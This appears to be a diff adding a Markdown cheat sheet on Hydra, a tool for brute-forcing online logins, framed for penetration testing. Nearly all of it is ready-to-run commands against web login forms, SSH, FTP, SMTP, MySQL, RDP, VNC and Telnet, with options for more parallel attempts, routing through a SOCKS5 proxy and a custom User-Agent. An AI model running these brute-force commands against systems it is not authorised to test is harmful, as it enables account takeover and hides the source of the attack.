@@ -1,0 +1,68 @@
+## 🔑 Hydra – Online Password Brute Force Tool
+
+**Hydra** is a fast and flexible command-line tool used for performing brute force attacks against online authentication services.  
+It supports a wide range of protocols and is commonly used to test the strength of login mechanisms during penetration testing.
+
+Hydra works by sending multiple authentication requests using username and password wordlists.
+
+### 🔹 Common Hydra Usage
+
+```bash
+# HTTP POST login brute force (single username)
+hydra -l admin -P passwords.txt example.com http-post-form \
+"/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
+
+# Dictionary attack with username and password lists
+hydra -L users.txt -P passwords.txt example.com http-post-form \
+"/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
+
+# Use custom User-Agent header
+hydra -l admin -P passwords.txt example.com http-post-form \
+"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" \
+-H "User-Agent: MyCustomUserAgent"
+
+# Specify a non-standard port
+hydra -l admin -P passwords.txt example.com http-post-form \
+"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" -s 8080
+
+# Route requests through a SOCKS5 proxy
+hydra -l admin -P passwords.txt example.com http-post-form \
+"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" \
+-x socks5://localhost:9050
+
+# Brute force using GET method
+hydra -l admin -P passwords.txt example.com http-get-form \
+"/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
+
+# Increase parallel login attempts
+hydra -l admin -P passwords.txt example.com http-post-form \
+"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" -t 16
+
+# Stop after first valid password is found
+hydra -l admin -P passwords.txt example.com http-post-form \
+"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" -F
+
+# Suppress verbose output (useful for scripting)
+hydra -l admin -P passwords.txt example.com http-post-form \
+"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" -q
+
+# SSH
+hydra -l username -P passwords.txt ssh://target_ip
+
+# FTP
+hydra -l admin -P wordlist.txt ftp://ftp.example.com
+
+# SMTP
+hydra -l email@example.com -P passwords.txt smtp://mail.example.com
+
+# MySQL
+hydra -l root -P passwords.txt mysql://target_ip
+
+# RDP
+hydra -l administrator -P passwords.txt rdp://target_ip
+
+# VNC
+hydra -l admin -P passwords.txt vnc://target_ip
+
+# Telnet
+hydra -l admin -P passwords.txt telnet://target_ip
